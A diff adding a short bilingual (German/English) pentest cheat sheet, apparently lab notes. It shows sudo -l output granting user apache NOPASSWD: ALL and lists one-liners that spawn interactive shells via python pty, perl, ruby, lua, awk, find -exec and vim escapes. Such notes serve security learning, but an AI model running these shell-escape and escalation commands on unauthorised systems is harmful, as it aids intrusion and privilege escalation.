@@ -1,0 +1,55 @@
+zeigt python version an
+locate python
+
+We can always attempt to run this command to list the file properties and permissions our account has over any given file or binary:
+ls -la <path/to/fileorbinary>
+
+
+sudo -l
+Matching Defaults entries for apache on ILF-WebSrv:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User apache may run the following commands on ILF-WebSrv:
+    (ALL : ALL) NOPASSWD: ALL
+The sudo -l command above will need a stable interactive shell to run.
+
+
+
+
+
+---------------------------------------------------
+spawnt tty shell with python
+python -c 'import pty; pty.spawn("/bin/sh")'
+oder zb mit bash und python 3
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+
+spawnt tty shell with bourne shell
+/bin/sh -i
+
+spawnt tty shell with perl
+perl —e 'exec "/bin/sh";'
+
+spawnt tty shell with ruby
+ruby: exec "/bin/sh"
+
+spawnt tty shell with
+lua: os.execute('/bin/sh')
+
+mit awk
+awk 'BEGIN {system("/bin/sh")}'
+
+mit find
+find / -name nameoffile -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;
+
+mit exec
+find . -exec /bin/sh \; -quit
+
+mit vim
+vim -c ':!/bin/sh'
+
+vim escape
+vim
+:set shell=/bin/sh
+:shell
